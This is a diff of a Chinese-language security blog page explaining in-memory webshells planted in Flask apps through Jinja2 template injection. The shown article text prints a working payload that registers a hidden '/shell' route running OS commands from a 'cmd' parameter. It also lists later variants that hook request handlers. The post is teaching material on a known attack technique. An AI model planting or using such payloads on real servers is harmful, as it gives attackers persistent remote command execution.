@@ -1,177 +1,183 @@
 <!DOCTYPE html>
-<html lang=en>
-<head>
-    <!-- so meta -->
-    <meta charset="utf-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="HandheldFriendly" content="True">
-    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="前置什么是内存马内存马是一种无文件落地的恶意代码。不同于传统的webshell：通常是一个文件。攻击者利用某些中间件的进程执行内存马，从而进行getshell！ flask的内存马又怎么说就是利用flask的ssti漏洞，进行插入内存马！与其说是flask的ssti，不如说是jinja2的，模板引擎是jinja2！ 旧马（flask2.x）payload分析1url_for.__globals__">
-<meta property="og:type" content="article">
-<meta property="og:title" content="flask下的内存马">
-<meta property="og:url" content="https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
-<meta property="og:site_name" content="Rufeii">
-<meta property="og:description" content="前置什么是内存马内存马是一种无文件落地的恶意代码。不同于传统的webshell：通常是一个文件。攻击者利用某些中间件的进程执行内存马，从而进行getshell！ flask的内存马又怎么说就是利用flask的ssti漏洞，进行插入内存马！与其说是flask的ssti，不如说是jinja2的，模板引擎是jinja2！ 旧马（flask2.x）payload分析1url_for.__globals__">
-<meta property="og:locale" content="en_US">
-<meta property="og:image" content="https://rufeii.github.io/images/achieve/2025/10/4.png">
-<meta property="og:image" content="https://rufeii.github.io/images/achieve/2025/10/5.png">
-<meta property="article:published_time" content="2025-10-29T11:12:27.000Z">
-<meta property="article:modified_time" content="2025-11-03T08:59:57.227Z">
-<meta property="article:author" content="Rufeii">
-<meta property="article:tag" content="内存马">
-<meta property="article:tag" content="flask">
-<meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://rufeii.github.io/images/achieve/2025/10/4.png">
+<html lang="en" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="Rufeii" />
+  <!-- Open Graph Description 简短摘要-->
+  
+  <!-- 用于搜索引擎的文章摘要 -->
+  
+  
+  
+  <title>
     
-    
-      
-        
-          <link rel="shortcut icon" href="/images/website.jpg">
-        
+      flask下的内存马 
       
       
-        
-          <link rel="icon" type="image/png" href="/images/website.jpg" sizes="192x192">
-        
-      
-      
-        
-          <link rel="apple-touch-icon" sizes="180x180" href="/images/website.jpg">
-        
-      
+      |
     
-    <!-- title -->
-    <title>flask下的内存马</title>
-    <!-- async scripts -->
-    <!-- Google Analytics -->
+     Rufeii
+  </title>
 
-
-    <!-- Umami Analytics -->
-
-
-    <!-- styles -->
-    
-<link rel="stylesheet" href="/css/style.css">
-
-    <!-- persian styles -->
-    
-    <!-- rss -->
-    
-    
-	<!-- mathjax -->
-	
-<meta name="generator" content="Hexo 7.3.0"></head>
-
-<body class="max-width mx-auto px3 ltr">
-    
-      <div id="header-post">
-  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
-  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
-  <span id="menu">
-    <span id="nav">
-      <ul>
-        <!--
-       --><li><a href="/">h0me</a></li><!--
-     --><!--
-       --><li><a href="/about/">ab0ut</a></li><!--
-     --><!--
-       --><li><a href="/categories/">categ0ries</a></li><!--
-     --><!--
-       --><li><a href="/links/">links</a></li><!--
-     --><!--
-       --><li><a href="/search/">Search</a></li><!--
-     -->
-      </ul>
-    </span>
-    <br/>
-    <span id="actions">
-      <ul>
-        
-        <li><a class="icon" aria-label="Previous post" href="/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
-        
-        
-        <li><a class="icon" aria-label="Next post" href="/2025/10/26/%E6%98%9F%E9%80%94ctf2025/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
-        
-        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
-      </ul>
-      <span id="i-prev" class="info" style="display:none;">Previous post</span>
-      <span id="i-next" class="info" style="display:none;">Next post</span>
-      <span id="i-top" class="info" style="display:none;">Back to top</span>
-      <span id="i-share" class="info" style="display:none;">Share post</span>
-    </span>
-    <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&text=flask下的内存马"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&title=flask下的内存马"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&is_video=false&description=flask下的内存马"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=flask下的内存马&body=Check out this article: https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&title=flask下的内存马"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&title=flask下的内存马"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&title=flask下的内存马"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&title=flask下的内存马"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&name=flask下的内存马&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&t=flask下的内存马"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-    
-    
-      <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">前置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text">什么是内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%88%E6%80%8E%E4%B9%88%E8%AF%B4"><span class="toc-number">1.2.</span> <span class="toc-text">flask的内存马又怎么说</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A7%E9%A9%AC%EF%BC%88flask2-x%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">旧马（flask2.x）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">payload分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flask%E8%AF%B7%E6%B1%82%E4%B8%8A%E4%B8%8B%E6%96%87%E6%9C%BA%E5%88%B6"><span class="toc-number">2.1.1.</span> <span class="toc-text">flask请求上下文机制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0test"><span class="toc-number">2.2.</span> <span class="toc-text">本地test</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E9%A9%AC%EF%BC%88flask3-x%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">新马（flask3.x）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A3%85%E9%A5%B0%E5%99%A8"><span class="toc-number">3.1.</span> <span class="toc-text">装饰器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8before-request"><span class="toc-number">3.1.1.</span> <span class="toc-text">利用before_request</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8after-request"><span class="toc-number">3.1.2.</span> <span class="toc-text">利用after_request</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hook%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">hook函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#teardown-request"><span class="toc-number">3.2.1.</span> <span class="toc-text">teardown_request</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#errorhandler"><span class="toc-number">3.2.2.</span> <span class="toc-text">errorhandler</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
-      </div>
-    
-  </span>
-</div>
-
-    
-    <div class="content index py4 ">
-        
-        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
-  <header>
-    
-    <h1 class="posttitle p-name" itemprop="name headline">
-        flask下的内存马
-    </h1>
-
-
-
-    <div class="meta">
-      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
-        <span class="p-name" itemprop="name">Rufeii</span>
-      </span>
-      
-    <div class="postdate">
-      
-        <time datetime="2025-10-29T11:12:27.000Z" class="dt-published" itemprop="datePublished">2025-10-29</time>
-        
-      
-    </div>
-
-
-      
-    <div class="article-category">
-        <i class="fa-solid fa-archive"></i>
-        <a class="category-link" href="/categories/python%E5%86%85%E5%AD%98%E9%A9%AC/">python内存马</a>
-    </div>
-
-
-      
-    <div class="article-tag">
-        <i class="fa-solid fa-tag"></i>
-        <a class="p-category" href="/tags/flask/" rel="tag">flask</a>, <a class="p-category" href="/tags/%E5%86%85%E5%AD%98%E9%A9%AC/" rel="tag">内存马</a>
-    </div>
-
-
-    </div>
-  </header>
+  
+    <link rel="apple-touch-icon" href="/images/me.jpg">
+    <link rel="icon" href="/images/me.jpg">
   
 
-  <div class="content e-content" itemprop="articleBody">
-    <h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="什么是内存马"><a href="#什么是内存马" class="headerlink" title="什么是内存马"></a>什么是内存马</h3><p>内存马是一种<strong>无文件落地</strong>的恶意代码。不同于传统的webshell：通常是一个文件。攻击者利用某些中间件的进程执行内存马，从而进行getshell！</p>
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  <link rel="stylesheet" href="/css/main.css" />
+  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
+  <!-- 代码块风格 -->
+  
+
+  <!-- jquery3.3.1 -->
+  
+    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
+  
+
+  <!-- fancybox -->
+  
+    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
+    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
+  
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/me.jpg" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">Rufeii</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/categories/">
+          <a href="/categories/">Categories</a>
+        </li>
+      
+        <li class="nav-item" data-path="/search/">
+          <a href="/search/">Search</a>
+        </li>
+      
+        <li class="nav-item" data-path="/links/">
+          <a href="/links/">Links</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+
+  <!-- LaTex Display -->
+
+  
+    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
+  
+  <script>
+    MathJax = {
+      tex: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']]
+      }
+    }
+  </script>
+
+
+
+
+
+  <!-- clipboard -->
+
+  
+    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
+  
+  
+<script src="/js/codeCopy.js"></script>
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">flask下的内存马</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+          2025-11-03 16:59:57
+        </span>
+        
+              <span class="post-categories">
+                <i class="iconfont icon-bookmark" title="Categories"></i>
+                
+                <span class="span--category">
+                  <a href="/categories/python%E5%86%85%E5%AD%98%E9%A9%AC/" title="python内存马">
+                    <b>#</b> python内存马
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="什么是内存马"><a href="#什么是内存马" class="headerlink" title="什么是内存马"></a>什么是内存马</h3><p>内存马是一种<strong>无文件落地</strong>的恶意代码。不同于传统的webshell：通常是一个文件。攻击者利用某些中间件的进程执行内存马，从而进行getshell！</p>
 <h3 id="flask的内存马又怎么说"><a href="#flask的内存马又怎么说" class="headerlink" title="flask的内存马又怎么说"></a>flask的内存马又怎么说</h3><p>就是利用flask的ssti漏洞，进行插入内存马！与其说是flask的ssti，不如说是jinja2的，模板引擎是jinja2！</p>
 <h2 id="旧马（flask2-x）"><a href="#旧马（flask2-x）" class="headerlink" title="旧马（flask2.x）"></a>旧马（flask2.x）</h2><h3 id="payload分析"><a href="#payload分析" class="headerlink" title="payload分析"></a>payload分析</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure>
 
@@ -302,150 +308,159 @@
 <p>当然不只是flask框架下可以打内存马，不同的框架有不同的打法，但原理估摸着都类似吧！</p>
 <p>比如：<a target="_blank" rel="noopener" href="https://www.caterpie771.cn/archives/333#%E7%BB%8F%E5%85%B8%E8%B7%AF%E7%BA%BF%EF%BC%9A%E6%89%93%E8%B7%AF%E7%94%B1%E6%B7%BB%E5%8A%A0%E5%87%BD%E6%95%B0">FastAPI 内存马的研究 - caterpie的小站</a></p>
 
-  </div>
-</article>
-
-
-
-        
-          <div id="footer-post-container">
-  <div id="footer-post">
-
-    <div id="nav-footer" style="display: none">
-      <ul>
-        
-          <li><a href="/">h0me</a></li>
-        
-          <li><a href="/about/">ab0ut</a></li>
-        
-          <li><a href="/categories/">categ0ries</a></li>
-        
-          <li><a href="/links/">links</a></li>
-        
-          <li><a href="/search/">Search</a></li>
-        
-      </ul>
-    </div>
-
-    
-    
-      <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-number">1.</span> <span class="toc-text">前置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-number">1.1.</span> <span class="toc-text">什么是内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%88%E6%80%8E%E4%B9%88%E8%AF%B4"><span class="toc-number">1.2.</span> <span class="toc-text">flask的内存马又怎么说</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A7%E9%A9%AC%EF%BC%88flask2-x%EF%BC%89"><span class="toc-number">2.</span> <span class="toc-text">旧马（flask2.x）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E5%88%86%E6%9E%90"><span class="toc-number">2.1.</span> <span class="toc-text">payload分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flask%E8%AF%B7%E6%B1%82%E4%B8%8A%E4%B8%8B%E6%96%87%E6%9C%BA%E5%88%B6"><span class="toc-number">2.1.1.</span> <span class="toc-text">flask请求上下文机制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0test"><span class="toc-number">2.2.</span> <span class="toc-text">本地test</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E9%A9%AC%EF%BC%88flask3-x%EF%BC%89"><span class="toc-number">3.</span> <span class="toc-text">新马（flask3.x）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A3%85%E9%A5%B0%E5%99%A8"><span class="toc-number">3.1.</span> <span class="toc-text">装饰器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8before-request"><span class="toc-number">3.1.1.</span> <span class="toc-text">利用before_request</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8after-request"><span class="toc-number">3.1.2.</span> <span class="toc-text">利用after_request</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hook%E5%87%BD%E6%95%B0"><span class="toc-number">3.2.</span> <span class="toc-text">hook函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#teardown-request"><span class="toc-number">3.2.1.</span> <span class="toc-text">teardown_request</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#errorhandler"><span class="toc-number">3.2.2.</span> <span class="toc-text">errorhandler</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">总结</span></a></li></ol>
       </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2025/10/26/%E6%98%9F%E9%80%94ctf2025/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>Prev</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime mr-10" title="Update time"></i>
+              2025-11-03 16:59:57
+            </span>
+            
+                  <span class="post-categories">
+                    <i class="iconfont icon-bookmark" title="Categories"></i>
+                    
+                    <span class="span--category">
+                      <a href="/categories/python%E5%86%85%E5%AD%98%E9%A9%AC/" title="python内存马">
+                        <b>#</b> python内存马
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2025/11/02/%E6%88%90%E9%83%BD%E5%A4%A7%E5%AD%A6%E7%AC%AC%E5%85%AB%E5%B1%8A%E7%8E%84%E6%AD%A6%E6%9D%AF%EF%BC%88ak%EF%BC%89/" target="_self">
+                <span>Next</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
     
-
-    <div id="share-footer" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&text=flask下的内存马"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&title=flask下的内存马"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&is_video=false&description=flask下的内存马"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=flask下的内存马&body=Check out this article: https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&title=flask下的内存马"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&title=flask下的内存马"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&title=flask下的内存马"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&title=flask下的内存马"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&name=flask下的内存马&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://rufeii.github.io/2025/10/29/Flask%E4%B8%8B%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/&t=flask下的内存马"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
-
-    <div id="actions-footer">
-        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
-        
-          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
-        
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
-        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
-    </div>
-
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
   </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">Contents</div>
+    <div class="catalog-content">
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E7%BD%AE"><span class="toc-text">前置</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%86%85%E5%AD%98%E9%A9%AC"><span class="toc-text">什么是内存马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#flask%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC%E5%8F%88%E6%80%8E%E4%B9%88%E8%AF%B4"><span class="toc-text">flask的内存马又怎么说</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A7%E9%A9%AC%EF%BC%88flask2-x%EF%BC%89"><span class="toc-text">旧马（flask2.x）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E5%88%86%E6%9E%90"><span class="toc-text">payload分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#flask%E8%AF%B7%E6%B1%82%E4%B8%8A%E4%B8%8B%E6%96%87%E6%9C%BA%E5%88%B6"><span class="toc-text">flask请求上下文机制</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AC%E5%9C%B0test"><span class="toc-text">本地test</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B0%E9%A9%AC%EF%BC%88flask3-x%EF%BC%89"><span class="toc-text">新马（flask3.x）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A3%85%E9%A5%B0%E5%99%A8"><span class="toc-text">装饰器</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8before-request"><span class="toc-text">利用before_request</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8after-request"><span class="toc-text">利用after_request</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#hook%E5%87%BD%E6%95%B0"><span class="toc-text">hook函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#teardown-request"><span class="toc-text">teardown_request</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#errorhandler"><span class="toc-text">errorhandler</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol>
+      
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+  </div>
+
+
+        
+<div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          
